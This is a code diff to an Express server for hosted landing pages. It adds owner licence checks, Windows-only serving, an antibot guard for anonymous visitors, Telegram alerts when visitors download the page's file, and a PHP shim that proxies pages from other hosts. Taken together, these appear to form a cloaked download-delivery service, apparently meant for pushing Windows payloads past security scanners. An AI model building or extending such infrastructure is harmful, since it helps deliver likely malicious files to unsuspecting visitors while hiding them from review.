+      return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#1a1a1a;">Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
+    }
+    if (!(await pageOwnerIsLicensed(page))) return res.status(200).send(BLANK_HTML);
+    if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
+    await renderPage(page, res, req);
+  });
 });
 
 async function downloadHandler(req, res) {
-  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [req.params.pageId]);
+  // Licensing: refuse if the page's owner license has expired. Any logged-in dashboard
+  // user is exempt so previews work; only anonymous visitor traffic enforces the gate.
+  if (!isAuthenticatedSession(req)) {
+    const owningPage = await queryOne('SELECT user_id FROM pages WHERE id = ?', [req.params.pageId]);
+    if (!(await pageOwnerIsLicensed(owningPage))) return res.status(404).json({ error: 'Not available' });
+  }
+
+  const activeVersion = await findActiveVersion(req.params.pageId, effectiveUserForRequest(req));
   if (!activeVersion) return res.status(404).json({ error: 'No active version' });
 
-  // Link URL — redirect
+  // Telegram alert only for real visitor traffic — skip dashboard previews so users
+  // don't get a buzz every time they click Preview.
+  const shouldAlert = !isAuthenticatedSession(req);
+
+  // Link URL — redirect (only allow http(s) schemes to block javascript:/data:/file: open redirects)
   if (activeVersion.link_url) {
+    if (!/^https?:\/\//i.test(activeVersion.link_url)) return res.status(400).send('Invalid link URL');
+    if (shouldAlert) {
+      const pageRow = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.pageId]);
+      if (pageRow) setImmediate(() => notifyDownload(req, pageRow, activeVersion));
+    }
     return res.redirect(activeVersion.link_url);
   }
 
-  // File download
+  // File download — safeUploadPath rejects anything that resolves outside uploadsDir.
   if (!activeVersion.file_path) return res.status(404).json({ error: 'No active file' });
-  const filePath = path.join(uploadsDir, activeVersion.file_path);
+  const filePath = safeUploadPath(activeVersion.file_path);
+  if (!filePath) return res.status(400).json({ error: 'Invalid file path' });
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found on disk' });
+
+  if (shouldAlert) {
+    const pageRow = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.pageId]);
+    if (pageRow) setImmediate(() => notifyDownload(req, pageRow, activeVersion));
+  }
 
   res.download(filePath, activeVersion.original_name || activeVersion.file_name);
 }
-app.get('/download/:pageId', botGuard, downloadHandler);
+app.get('/download/:pageId', (req, res, next) => {
+  // Dashboard preview: any logged-in user can pull the actual download to verify it.
+  // Anonymous traffic still runs botGuard.
+  if (isAuthenticatedSession(req)) return downloadHandler(req, res, next);
+  return botGuard(req, res, () => downloadHandler(req, res, next));
+});
 
 // ═══════════ PHP SHIM MOUNT ═══════════
 // The deployed index.php forwards every visitor request to /_shim/proxy/<original-path>.
 // shimAuth validates the deployment secret against the page it was issued for and sets
 // req._shimPageId / req._shimRealIp; from there the existing antibot + render pipeline
 // runs unchanged. No domain is required — the deployment is anchored to a page id.
+// shimAuth validates the X-Shim-Key against:
+//   1. The per-(page, user) deployments table — sets req._shimPageId AND req._shimUserId.
+//   2. Legacy pages.shim_secret as a fallback — sets req._shimPageId, leaves _shimUserId
+//      null (these are shims deployed before the per-user model existed; they keep working
+//      but serve versions with user_id IS NULL or the page owner's versions).
+function timingEq(a, b) {
+  const ba = Buffer.from(a); const bb = Buffer.from(b);
+  return ba.length === bb.length && crypto.timingSafeEqual(ba, bb);
+}
 async function shimAuth(req, res, next) {
   const pageId = (req.headers['x-shim-page'] || '').trim();
   const key    = req.headers['x-shim-key']  || '';
   const ip     = req.headers['x-shim-real-ip'] || '';
   if (!pageId || !key || !ip) return res.status(400).send('shim headers missing');
 
-  const row = await queryOne('SELECT shim_secret FROM pages WHERE id = ?', [pageId]);
-  if (!row || !row.shim_secret) return res.status(403).send('unknown deployment');
-
-  const a = Buffer.from(row.shim_secret);
-  const b = Buffer.from(key);
-  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
-    return res.status(403).send('bad key');
+  // Per-user deployment lookup (preferred).
+  const deployment = await queryOne('SELECT id, user_id, shim_secret FROM deployments WHERE page_id = ? AND shim_secret = ?', [pageId, key]);
+  if (deployment && timingEq(deployment.shim_secret, key)) {
+    req._shimRealIp = ip.startsWith('::ffff:') ? ip.substring(7) : ip;
+    req._shimPageId = pageId;
+    req._shimUserId = deployment.user_id;
+    return next();
   }
-  req._shimRealIp = ip.startsWith('::ffff:') ? ip.substring(7) : ip;
-  req._shimPageId = pageId;
-  next();
+
+  // Legacy fallback: page-wide shim_secret. Serves versions with user_id IS NULL or the
+  // page owner's user_id (whichever exists).
+  const page = await queryOne('SELECT shim_secret, user_id FROM pages WHERE id = ?', [pageId]);
+  if (page && page.shim_secret && timingEq(page.shim_secret, key)) {
+    req._shimRealIp = ip.startsWith('::ffff:') ? ip.substring(7) : ip;
+    req._shimPageId = pageId;
+    req._shimUserId = page.user_id || null;
+    return next();
+  }
+
+  return res.status(403).send('bad key');
 }
 
 const shimRouter = express.Router();
 shimRouter.use(shimAuth);
-shimRouter.post('/api/bot-verify', botVerifyHandler);
-shimRouter.get('/download/:pageId', botGuard, downloadHandler);
+// Match bot-verify at any subpath under the shim mount, so it works regardless of
+// where the shim is deployed on the visitor host (root, /landing/, /shim/anything/, …).
+shimRouter.post(/\/api\/bot-verify\/?$/, botVerifyHandler);
+shimRouter.get(/\/download\/([^/]+)\/?$/, botGuard, (req, res, next) => {
+  req.params.pageId = req.params[0];
+  return downloadHandler(req, res, next);
+});
 shimRouter.use(botGuard);
 shimRouter.use(shimPageRoute);
 app.use('/_shim/proxy', shimRouter);
